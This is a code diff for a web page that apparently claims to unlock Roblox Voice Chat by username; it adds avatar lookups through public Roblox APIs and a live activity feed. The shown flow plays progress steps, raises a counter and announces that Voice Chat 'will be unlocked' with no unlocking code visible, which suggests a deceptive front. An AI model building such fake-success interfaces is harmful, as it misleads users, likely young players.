@@ -89,28 +89,77 @@ function getTimeAgo(timestamp) {
     return `${Math.floor(hours / 24)} days ago`;
 }
 
-function renderActivityFeed() {
+async function fetchUserAvatar(username) {
+    try {
+        const response = await fetch(`https://users.roblox.com/v1/usernames/users`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                usernames: [username],
+                excludeBannedUsers: false
+            })
+        });
+        
+        const data = await response.json();
+        
+        if (data.data && data.data.length > 0 && data.data[0].id) {
+            const userId = data.data[0].id;
+            const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=100x100&format=Png&isCircular=false`);
+            const avatarData = await avatarResponse.json();
+            
+            if (avatarData.data && avatarData.data[0] && avatarData.data[0].imageUrl) {
+                return {
+                    userId: userId,
+                    avatarUrl: avatarData.data[0].imageUrl
+                };
+            }
+        }
+        
+        return {
+            userId: null,
+            avatarUrl: 'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=100&height=100&format=png'
+        };
+    } catch (error) {
+        console.error('Error fetching avatar:', error);
+        return {
+            userId: null,
+            avatarUrl: 'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=100&height=100&format=png'
+        };
+    }
+}
+
+async function renderActivityFeed() {
     activityFeed.innerHTML = '';
+    
     if (activityHistory.length === 0) {
-        activityFeed.innerHTML = '<div class="activity-item"><i class="fas fa-info-circle"></i><span>No recent activity</span><span class="activity-time"></span></div>';
+        activityFeed.innerHTML = '<div class="activity-item"><div class="activity-avatar"></div><span>No recent activity</span><span class="activity-time"></span></div>';
         return;
     }
     
-    activityHistory.forEach((activity) => {
+    for (const activity of activityHistory) {
+        const userInfo = await fetchUserAvatar(activity.username);
+        const avatarUrl = userInfo.avatarUrl;
+        
         const activityItem = document.createElement('div');
         activityItem.className = 'activity-item';
         activityItem.innerHTML = `
-            <i class="fas fa-check-circle"></i>
+            <div class="activity-avatar" style="background-image: url('${avatarUrl}'); background-size: cover; background-position: center;"></div>
             <span><span class="activity-user">@${activity.username}</span> just unlocked VC</span>
             <span class="activity-time">${getTimeAgo(activity.timestamp)}</span>
         `;
         activityFeed.appendChild(activityItem);
-    });
+    }
 }
 
-function addRealActivity(username) {
+async function addRealActivity(username) {
+    const userInfo = await fetchUserAvatar(username);
+    
     activityHistory.unshift({
         username: username,
+        userId: userInfo.userId,
+        avatarUrl: userInfo.avatarUrl,
         timestamp: Date.now()
     });
     
@@ -119,7 +168,7 @@ function addRealActivity(username) {
     }
     
     saveActivityHistory();
-    renderActivityFeed();
+    await renderActivityFeed();
 }
 
 function resetSteps() {
@@ -217,17 +266,27 @@ function isValidUsername(username) {
     return usernameRegex.test(username.trim());
 }
 
-async function fetchUserAvatar(username) {
+async function fetchUserAvatarForSave(username) {
     try {
-        const response = await fetch(`https://api.roblox.com/users/get-by-username?username=${encodeURIComponent(username)}`);
+        const response = await fetch(`https://users.roblox.com/v1/usernames/users`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                usernames: [username],
+                excludeBannedUsers: false
+            })
+        });
+        
         const data = await response.json();
         
-        if (data && data.Id) {
-            const userId = data.Id;
-            const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=100x100&format=Png`);
+        if (data.data && data.data.length > 0 && data.data[0].id) {
+            const userId = data.data[0].id;
+            const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=100x100&format=Png&isCircular=false`);
             const avatarData = await avatarResponse.json();
             
-            if (avatarData.data && avatarData.data[0]) {
+            if (avatarData.data && avatarData.data[0] && avatarData.data[0].imageUrl) {
                 return {
                     userId: userId,
                     avatarUrl: avatarData.data[0].imageUrl
@@ -249,7 +308,7 @@ async function fetchUserAvatar(username) {
 }
 
 async function saveRecentUser(username) {
-    const userInfo = await fetchUserAvatar(username);
+    const userInfo = await fetchUserAvatarForSave(username);
     
     const newUser = {
         username: username,
@@ -283,8 +342,8 @@ function loadRecentUsers() {
         recentList.innerHTML = `
             <div class="recent-empty">
                 <i class="fas fa-user-friends"></i>
-                <p>No recent users yet</p>
-                <p style="font-size: 12px; margin-top: 8px;">Enter a username above to get started</p>
+                <p>No saved profiles yet</p>
+                <p style="font-size: 12px; margin-top: 8px;">Enter a username above to save profiles</p>
             </div>
         `;
         return;
@@ -358,7 +417,7 @@ async function handleConfirm() {
     try {
         await saveRecentUser(username);
         animateNewCard();
-        showNotification("Recent Activity Updated", `@${username} has been added to recent users`, "success");
+        showNotification("Recent Activity Updated", `@${username} has been added to saved profiles`, "success");
     } catch (error) {
         console.error('Error saving recent user:', error);
     }
@@ -369,13 +428,13 @@ async function handleConfirm() {
     resetSteps();
     modalOverlay.classList.add('active');
     
-    runSteps(() => {
+    runSteps(async () => {
         completeProgress();
         todayCount++;
         todayCountElem.textContent = todayCount.toLocaleString();
         saveTodayCount();
         
-        addRealActivity(username);
+        await addRealActivity(username);
         
         showNotification("Success!", `Voice Chat will be unlocked for @${username} within 24 hours`, "success");
         
@@ -415,15 +474,16 @@ document.getElementById('profileLinkInput').addEventListener('keypress', functio
     }
 });
 
-setInterval(() => {
-    renderActivityFeed();
+setInterval(async () => {
+    await renderActivityFeed();
 }, 60000);
 
 todayCountElem.textContent = todayCount.toLocaleString();
 renderActivityFeed();
 
-document.addEventListener('DOMContentLoaded', () => {
+document.addEventListener('DOMContentLoaded', async () => {
     loadRecentUsers();
+    await renderActivityFeed();
 });
 
 setTimeout(() => {
